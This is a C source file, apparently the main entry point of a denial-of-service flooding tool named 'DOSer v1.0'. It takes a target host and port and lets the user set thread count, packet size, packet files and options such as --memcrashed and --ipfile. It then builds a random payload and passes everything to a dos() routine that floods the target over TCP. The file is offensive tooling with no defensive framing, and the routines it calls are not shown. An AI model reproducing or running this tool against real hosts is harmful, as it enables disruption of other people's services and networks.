
#include <stdbool.h>
#include <time.h>
#include <stdint.h>

#include "dos.h"
#include "message.h"
#include "socket.h"
#include "packet.h"


bool socket_wait;

int main(int argc, const char* argv[])
{
    socket_wait = true;
    hide_warnings = false;
    srand(time(NULL));
    if(!checklarg("--hide-logo", argv, argc)){
        printf("█████╗  ╔██████╗ ███████╗███████╗██████╗\n");
        printf("██╔══██╗██╔═══██╗██╔════╝██╔════╝██╔══██╗\n");
        printf("██║  ██║██║   ██║███████╗█████╗  ██████╔╝\n");
        printf("██║  ██║██║   ██║╚════██║██╔══╝  ██╔══██╗\n");
        printf("██████╔╝╚██████╔╝███████║███████╗██║  ██║\n");
        printf(" ╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝\n");
        printf("                                             v1.0-first-try\n");
    }
    info("DOSer v1.0 by Jimmy(NJUPT IOT)");
#ifdef DEBUG
    info("Starting in DEBUG mode");
#endif
    if (argc < 3 || checkarg("-h", argv, argc)) {
        info("Usage:%s -[h] <HOST> <PORT> -[r] -t <THREAD COUNT> -s <PACKET SIZE> [--http --no-warnings --no-check --no-wait --no-status --packetfile <FILENAME> --memcrashed --ipfile <FILENAME>]", argv[0]);
        return 0;
    }
    const char* _host = argv[1];  //输入的攻击IP或域名
    char* host = (char*)malloc(sizeof(char) * 14);
    info("Starting up");
    if (hostname2ip(_host, host)) {
        error("Failed to resolve host:%s", _host);
#ifdef DEBUG
        error("DEBUG:hostname2ip(%s,%s)->%d,host=%s", _host, host, hostname2ip(_host, host), host);
#endif
        return -1;
    }
    use_dos_sleep=checklarg("--sleep",argv,argc);
    status=!checklarg("--no-status", argv, argc);
    if(use_dos_sleep){
        const char* RAW_SLEEP=getlarg("--sleep",argv,argc);
        dos_sleep=atoi(RAW_SLEEP);
    }
    if(dos_sleep<0){
        die("Invalid sleep argument");
    }
    int port = atoi(argv[2]);
    if (port < 0) {
        error("Bad port supplied!");
        return -1;
    }
    hide_warnings = checklarg("--no-warnings", argv, argc);
    hide_errors = checklarg("--no-errors", argv, argc);
    bool RANDOM_PACKET = checkarg("-r", argv, argc);
    int THREAD_COUNT = 5;
    size_t PACKET_SIZE = 4096;
    if (checkarg("-s", argv, argc)) {
        const char* raw_packetsize = getarg("-s", argv, argc);
        PACKET_SIZE = atoi(raw_packetsize);
    }
    if (checkarg("-t", argv, argc)) {
        const char* raw_threadcount = getarg("-t", argv, argc);
        THREAD_COUNT = atoi(raw_threadcount);
#ifdef DEBUG
        info("THREAD_COUNT=%d<-%s", THREAD_COUNT, raw_threadcount);
#endif
    }
    char* packet = NULL;
    if (PACKET_SIZE <= 0) {
        error("Bad packet size!");
        return -1;
    }
    

#ifdef DEBUG
        info("Using random tcp packet");
#endif
        packet = randstring(PACKET_SIZE);

    if (THREAD_COUNT <= 0) {
        error("Bad thread count!");
        return -1;
    }

    int PROTOCOL = MODE_EMPTY;    //选择的协议

    if (checklarg("--packetfile", argv, argc)) {
        packet = readfile(getlarg("--packetfile", argv, argc));
        if (packet == 0) {
            error("Failed to read packet file!");
            error("Exiting!");
            return -1;
        }
        PACKET_SIZE = strlen(packet);
    }
    metrics=SIZE_MB;

    hide_warnings = checklarg("--no-warnings", argv, argc);
    bool check = !checklarg("--no-check", argv, argc);
    socket_wait = !checklarg("--no-wait", argv, argc);

    if(PROTOCOL==MODE_EMPTY){
#ifdef DEBUG
        info("Automatically set mode to TCP");
#endif
        PROTOCOL=MODE_TCP;
    }
#ifdef DEBUG
    info("Configuration:");
    info("HIDE_WARNINGS=%d", hide_warnings);
    info("HIDE ERRORS=%d",hide_errors);
    info("RANDOM_PACKET=%d", RANDOM_PACKET);
    info("THREAD_COUNT=%d", THREAD_COUNT);
    info("PACKET_SIZE=%d", PACKET_SIZE);
    info("MODE=%d", PROTOCOL);
    info("USE_HTTP=%d", USE_HTTP);
    info("STATUS=%d",status);
    info("METRICS_TYPE=%d",metrics);
    info("METRICS_STR=%s",metrics2str(metrics));
#endif

    dos(host, port, packet, THREAD_COUNT, PROTOCOL);

    return 0;
}
